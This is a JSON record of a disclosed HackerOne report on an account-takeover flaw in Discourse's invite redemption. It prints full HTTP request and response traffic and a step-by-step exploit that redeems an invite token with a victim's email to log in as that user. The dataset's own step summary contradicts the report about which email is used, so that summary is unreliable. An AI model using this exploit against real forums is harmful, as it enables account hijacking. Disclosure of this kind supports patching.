{
  "reported_to": "Discourse",
  "reported_by": "mishre ",
  "title": "Any user with invite capabilities can take-over any account on Discourse",
  "content": "\nDescription\nUsers with a trust level of 2 and above on Discourse (being a member for 15 days,reading more than 100 posts and more - can be seen on: https://github.com/discourse/discourse/blob/b7386958edfb8215c99d90fde04521b3312d2ccd/config/site_settings.yml) can invite new users to join discourse by sending an invite request. However, there exists an endpoint which uses the invite key without verifying the associated mail with the request and logs in a user to the victim's account if a valid invite key is provided.\nSteps to reproduce\n1) Login with a user with trust level of 2 or above to discourse (tested on my local instal and against the code).\n2) Now find a valid CSRF-TOKEN by browsing the site and then send the following request:\nCode 695 Bytes\n1POST http://localhost:4000/invites/link HTTP/1.1\n2Host: localhost:4000\n3Connection: keep-alive\n4Content-Length: 35\n5Origin: http://localhost:4000\n6X-CSRF-Token: 8DkyJoFTPN4G4f3dBUWp2AsEtTg3mp7/pmoqQ9JLaZeCsKSX5DPce0O+57ni+Gc/O0cbU2rl7Y3Bdf9i2s+uZg==\n7Discourse-Visible: true\n8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\n9Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n10Accept: */*\n11X-Requested-With: XMLHttpRequest\n12Referer: http://localhost:4000/\n13Accept-Encoding: gzip, deflate, sdch, br\n14Accept-Language: he-IL,he;q=0.8,en-US;q=0.6,en;q=0.4,es;q=0.2\n15Cookie: {redacted}\n16\n17email=testingmichaelreiz@gmail.coma\nyou\"ll receive the following response:\nCode 1.18 KiB\n1HTTP/1.1 200 OK\n2X-Frame-Options: SAMEORIGIN\n3X-XSS-Protection: 1; mode=block\n4X-Content-Type-Options: nosniff\n5X-Discourse-Username: {some-user}\n6X-Discourse-Route: invites/create_invite_link\n7Cache-Control: no-store, must-revalidate, private, max-age=0\n8Content-Type: application/json; charset=utf-8\n9Set-Cookie: _t=8f6f82a4709bad6dd66263a225f202c5; path=/; expires=Tue, 22 Aug 2017 21:14:37 -0000; HttpOnly; SameSite=Lax\n10Set-Cookie: _forum_session=RUpSZFVQZmx2emVieVYwM0tscDBKV29jZ3FmU2xXSmIvTGlPTFpTVit0Z1lCU29wYmN6eDlkTDFnWXF1a1RUcVluNy9UYVhkd3hNK1h1OHZwNFBYL202WllEUkJzbWVRTytVR0VRenlxMUsrZUF6cktQSm1JU0g2Y3p1WVlNZ2dXSHNINlVDUzZzSFBQcXVVQXZDR1c5dFhkc1c0Tmk3bDRlK2ljRFRraTF6bmp2QzgxTlNnTXBhWnllVU1HelptLS16cUVkVmg5cC9JdC91RzhRenJqSGVnPT0%3D--c3b63a42a9a94781bc137c1030a71a1241c04a24; path=/; HttpOnly; SameSite=Lax\n11Set-Cookie: __profilin=p%3Dt; path=/\n12X-Request-Id: 4181e2be-5061-49dd-b3cc-1e033ece95bc\n13X-Runtime: 1.912866\n14X-MiniProfiler-Ids: [\"jfv6h7gfji19eekx7p57\",\"nsqp68md79y8tusrn8rn\",\"4s5fo1o25vp9l7954ybm\",\"blf2ua82vyc0n9683jwb\",\"fe5d5qfugyl5u0hjp7ez\",\"3s7hzl7imehtnono8p18\",\"dmmjnggyftilvg882j9q\",\"bwvs5enxy6pqockcxael\",\"tfu1fnjp7hi5e0nxhqwf\"]\n15Content-Length: 64\n16\n17\"http://localhost:3000/invites/{some-token}\"\nNow copy the token for a use in the later steps - don't click the link.\n3) Now open a new incognito tab and launch the following url:\nCode 83 Bytes\n1http://localhost:4000/invites/redeem/{token-from-step3}?email=victimemail@gmail.com\nYou should now be logged in to the victim's account.\nResolution\nYou should probably bind the invite token to a specific email in the InvitesController class. Also, the InvitesController seems to log in any user which launches a disposable invite link to the account with the email provided along the request as can be seen in the invites controller class:\nCode 253 Bytes\n1    invite = Invite.find_by(invite_key: params[:token])\n2\n3    if invite.present?\n4      user = Invite.redeem_from_token(params[:token], params[:email], params[:username], params[:name], params[:topic].to_i)\n5      if user.present?\n6        log_on_user(user)\nImpact\nAny user with invitation capabilities can therefore login as an admin account in case he knows either his username or his email.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 1024,
  "weaknesses": [
    "None"
  ],
  "screenshots": {},
  "disclosed_date": 1509968100,
  "report_url": "https://hackerone.com/reports/242765",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Login with a user having trust level 2 or above on Discourse."
    ],
    [
      2,
      "Generate an invite link for a target email (e.g., victim@gmail.com) and extract the invite token from the response."
    ],
    [
      3,
      "In a new incognito tab, visit the invite redemption URL with the extracted token and a different email (e.g., attacker@gmail.com)."
    ],
    [
      4,
      "Observe that you are logged into the victim's account instead of the attacker's account."
    ]
  ],
  "vuln_description": "Any user with invite capabilities can take over any account on Discourse by exploiting an insecure invite redemption process. The system does not validate the email associated with the invite token, allowing an attacker to log in as any user by providing a valid token and a different email.",
  "reason": "The vulnerability involves understanding the invite system and identifying the lack of email validation during the redemption process. While the steps are straightforward, the flaw is non-obvious as it requires recognizing that the invite token is not bound to a specific email.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}